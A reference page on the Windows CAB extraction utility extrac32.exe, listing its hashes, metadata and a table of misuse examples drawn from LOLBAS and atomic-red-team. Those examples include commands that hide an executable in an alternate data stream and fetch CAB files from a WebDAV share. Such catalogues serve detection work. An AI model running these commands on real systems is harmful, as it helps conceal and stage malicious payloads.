---
title: extrac32.exe | Microsoft CAB File Extract Utility
excerpt: What is extrac32.exe?
---

# extrac32.exe 

* File Path: `C:\windows\SysWOW64\extrac32.exe`
* Description: Microsoft CAB File Extract Utility

## Hashes

Type | Hash
-- | --
MD5 | `9A2112C578A445FE5E525361ED6FB0DB`
SHA1 | `2283CEA233C697B19BEB68F5C7117E7EA9BA549D`
SHA256 | `8E0E651A59FDF07F2161D2578BAA97BA6DE8B624F4AB9A17D3C633F4A060B522`
SHA384 | `F1AEC56F7218C86DD1C6E01621871001CA32C2170AEE831B740A39C8CA5FB3CC5F91779186B5834688A7611C9E76C56C`
SHA512 | `D55406645D9F70A331B351C3FCD7722B7BBC911297ADEB7620AB820BF027A757B7D39B748C4E592DD1E5BCC5A773BDBC59B2F49CC7740CEA92F7EA459184F23D`
SSDEEP | `768:QYD4e6vK84jRXBvKSSrccAQ6MhYQsq/a337v9lC6zW:QO4eqD4FRvKiK6MOQ2bC6K`

## Signature

* Status: The file C:\windows\SysWOW64\extrac32.exe is not digitally signed. You cannot run this script on the current system. For more information about running scripts and setting execution policy, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170
* Serial: ``
* Thumbprint: ``
* Issuer: 
* Subject: 

## File Metadata

* Original Filename: extrac32.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 6.3.9600.16384 (winblue_rtm.130821-1623)
* Product Version: 6.3.9600.16384
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `extrac32.exe` being misused. While `extrac32.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `Name: Extrac32.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\System32\extrac32.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\SysWOW64\extrac32.exe`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


